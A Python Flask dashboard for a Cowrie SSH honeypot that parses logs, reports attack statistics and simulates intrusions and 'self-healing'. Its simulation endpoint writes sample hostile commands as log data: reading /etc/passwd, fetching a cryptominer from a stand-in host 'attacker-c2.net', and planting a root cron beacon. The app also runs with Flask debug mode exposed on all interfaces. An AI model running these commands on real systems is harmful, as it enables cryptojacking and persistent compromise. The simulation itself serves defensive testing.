#!/usr/bin/env python3
# ==============================================================================
# HoneyTrap - Threat Intelligence & Self-Healing Security Dashboard
# Framework: Flask + REST API + Real-time Forensic Log Processor
# ==============================================================================

import os
import json
import glob
import time
from datetime import datetime
from collections import Counter
from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
EVIDENCE_DIR = os.path.join(BASE_DIR, "evidence")
STATUS_FILE = os.path.join(DATA_DIR, "status.json")
LOCAL_LOG = os.path.join(DATA_DIR, "cowrie.json")
SYSTEM_COWRIE_LOG = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(EVIDENCE_DIR, exist_ok=True)

# Default initial healing status
DEFAULT_STATUS = {
    "state": "ACTIVE",
    "status_text": "HoneyTrap is ARMED and monitoring perimeter on Port 22.",
    "last_healing_event": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "honeypot_ip": "10.0.2.10 (Public Trap)",
    "active_phase": "ARMED_AND_OPERATIONAL",
    "healing_in_progress": False
}

def get_system_status():
    if os.path.exists(STATUS_FILE):
        try:
            with open(STATUS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return DEFAULT_STATUS
    return DEFAULT_STATUS

def set_system_status(status_dict):
    with open(STATUS_FILE, "w", encoding="utf-8") as f:
        json.dump(status_dict, f, indent=2)

def get_log_file_path():
    """Check if running on AWS EC2 with real Cowrie log, else fallback to local dataset"""
    if os.path.exists(SYSTEM_COWRIE_LOG):
        return SYSTEM_COWRIE_LOG
    return LOCAL_LOG

def parse_cowrie_logs():
    """Parse Cowrie JSON logs and extract telemetry"""
    log_path = get_log_file_path()
    events = []
    if not os.path.exists(log_path):
        return events

    try:
        with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        events.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
    except Exception as e:
        print(f"Error reading {log_path}: {e}")
    return events

# Country mapper helper for IPs
GEO_MAP = {
    "185.220.101.5": "Germany",
    "45.155.205.233": "Russia",
    "103.145.13.11": "China",
    "194.26.29.112": "Netherlands",
    "89.248.163.64": "Seychelles",
    "198.51.100.42": "United States",
    "203.0.113.19": "United Kingdom",
}

def enrich_event(event):
    ip = event.get("src_ip", "Unknown")
    if "country" not in event:
        event["country"] = GEO_MAP.get(ip, "International Proxy")
    return event

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/attacks")
def attacks_view():
    return render_template("attacks.html")

@app.route("/evidence")
def evidence_view():
    return render_template("evidence.html")

@app.route("/architecture")
def architecture_view():
    return render_template("architecture.html")

# ------------------------------------------------------------------------------
# REST API ENDPOINTS
# ------------------------------------------------------------------------------

@app.route("/api/stats")
def api_stats():
    raw_events = parse_cowrie_logs()
    events = [enrich_event(e) for e in raw_events]

    total_events = len(events)
    unique_ips = len(set(e.get("src_ip") for e in events if e.get("src_ip")))
    
    logins_failed = sum(1 for e in events if e.get("eventid") == "cowrie.login.failed")
    logins_success = sum(1 for e in events if e.get("eventid") == "cowrie.login.success")
    commands_typed = sum(1 for e in events if e.get("eventid") == "cowrie.command.input")

    passwords = [e.get("password") for e in events if e.get("password")]
    usernames = [e.get("username") for e in events if e.get("username")]
    countries = [e.get("country") for e in events if e.get("country")]
    ips = [e.get("src_ip") for e in events if e.get("src_ip")]

    top_passwords = Counter(passwords).most_common(5)
    top_usernames = Counter(usernames).most_common(5)
    top_countries = Counter(countries).most_common(5)
    top_ips = Counter(ips).most_common(5)

    status = get_system_status()

    return jsonify({
        "total_events": total_events,
        "unique_ips": unique_ips,
        "logins_failed": logins_failed,
        "logins_success": logins_success,
        "commands_typed": commands_typed,
        "top_passwords": [{"password": p, "count": c} for p, c in top_passwords],
        "top_usernames": [{"username": u, "count": c} for u, c in top_usernames],
        "top_countries": [{"country": k, "count": v} for k, v in top_countries],
        "top_ips": [{"ip": ip, "count": count} for ip, count in top_ips],
        "system_status": status
    })

@app.route("/api/attacks")
def api_attacks():
    raw_events = parse_cowrie_logs()
    attacks = []
    for e in reversed(raw_events):
        eventid = e.get("eventid", "")
        if eventid in ["cowrie.login.failed", "cowrie.login.success", "cowrie.command.input", "cowrie.session.connect"]:
            attacks.append(enrich_event(e))
        if len(attacks) >= 50:
            break
    return jsonify(attacks)

@app.route("/api/commands")
def api_commands():
    raw_events = parse_cowrie_logs()
    commands = []
    for e in reversed(raw_events):
        if e.get("eventid") == "cowrie.command.input":
            commands.append(enrich_event(e))
        if len(commands) >= 30:
            break
    return jsonify(commands)

@app.route("/api/status")
def api_status():
    return jsonify(get_system_status())

@app.route("/api/simulate-attack", methods=["POST"])
def api_simulate_attack():
    """Generates realistic attacks into the log stream to test Nagios & Self-Healing"""
    data = request.get_json() or {}
    attack_type = data.get("type", "brute_force")
    
    simulated_ips = ["198.51.100.42", "89.248.163.64", "194.26.29.112", "45.155.205.233"]
    import random
    src_ip = random.choice(simulated_ips)
    country = GEO_MAP.get(src_ip, "Proxy / TOR")
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    session_id = f"sim_{int(time.time())}"

    new_records = []
    if attack_type == "brute_force":
        passwords = ["admin", "root", "toor", "123456", "superman", "guest"]
        for p in passwords[:3]:
            new_records.append({
                "eventid": "cowrie.login.failed",
                "src_ip": src_ip,
                "username": "root",
                "password": p,
                "session": session_id,
                "timestamp": ts,
                "country": country
            })
        new_records.append({
            "eventid": "cowrie.login.success",
            "src_ip": src_ip,
            "username": "root",
            "password": "toor",
            "session": session_id,
            "timestamp": ts,
            "country": country
        })
    elif attack_type == "malware_command":
        new_records.append({
            "eventid": "cowrie.login.success",
            "src_ip": src_ip,
            "username": "admin",
            "password": "password123",
            "session": session_id,
            "timestamp": ts,
            "country": country
        })
        malicious_cmds = [
            "cat /etc/passwd",
            "curl -fsSL http://attacker-c2.net/xmrig.tar.gz | tar -xz",
            "./xmrig -o stratum+tcp://pool.minexmr.com:443",
            "crontab -l",
            "echo '* * * * * curl http://attacker-c2.net/beacon' >> /var/spool/cron/crontabs/root"
        ]
        for cmd in malicious_cmds:
            new_records.append({
                "eventid": "cowrie.command.input",
                "src_ip": src_ip,
                "session": session_id,
                "input": cmd,
                "timestamp": ts,
                "country": country
            })

    # Append to active log
    log_target = get_log_file_path()
    with open(log_target, "a", encoding="utf-8") as f:
        for rec in new_records:
            f.write(json.dumps(rec) + "\n")

    # Update system status to reflect intrusion
    status = {
        "state": "UNDER_ATTACK",
        "status_text": f"Active intrusion detected from {src_ip} ({country})! Nagios alert firing...",
        "last_healing_event": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "honeypot_ip": "10.0.2.10 (Public Trap)",
        "active_phase": "NAGIOS_ALERT_TRIGGERED",
        "healing_in_progress": True
    }
    set_system_status(status)

    return jsonify({
        "status": "success",
        "message": f"Simulated {attack_type} attack logged from {src_ip}",
        "records_injected": len(new_records)
    })

@app.route("/api/trigger-healing", methods=["POST"])
def api_trigger_healing():
    """Executes the full automated self-healing pipeline simulation"""
    ts = datetime.utcnow().strftime("%Y-%m-%d_%H%M%S")
    archive_name = f"incident_evidence_{ts}.tar.gz"
    
    # 1. Simulate saving evidence package
    evidence_meta = {
        "archive_id": archive_name,
        "s3_path": f"s3://honeytrap-evidence-store/incidents/{ts}/{archive_name}",
        "ebs_snapshot_id": f"snap-0a{int(time.time())}beef",
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "status": "SECURED_TO_S3",
        "hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    }
    meta_file = os.path.join(EVIDENCE_DIR, f"evidence_{ts}.json")
    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(evidence_meta, f, indent=2)

    # 2. Reset system status back to healthy / ARMED
    status = {
        "state": "ACTIVE",
        "status_text": f"Honeypot healed & re-armed! Evidence archived to S3 ({archive_name})",
        "last_healing_event": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "honeypot_ip": "10.0.2.10 (Public Trap)",
        "active_phase": "ARMED_AND_OPERATIONAL",
        "healing_in_progress": False
    }
    set_system_status(status)

    return jsonify({
        "status": "success",
        "message": "Automated Incident Response & Self-Healing cycle completed successfully!",
        "evidence": evidence_meta
    })

@app.route("/api/evidence")
def api_evidence():
    evidence_files = glob.glob(os.path.join(EVIDENCE_DIR, "evidence_*.json"))
    records = []
    for ef in evidence_files:
        try:
            with open(ef, "r", encoding="utf-8") as f:
                records.append(json.load(f))
        except Exception:
            continue
    records.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
    return jsonify(records)

@app.route("/api/reset", methods=["POST"])
def api_reset():
    set_system_status(DEFAULT_STATUS)
    return jsonify({"status": "reset_successful"})

if __name__ == "__main__":
    print("[+] HoneyTrap Threat Intelligence & Self-Healing Dashboard starting on port 5000...")
    app.run(host="0.0.0.0", port=5000, debug=True)
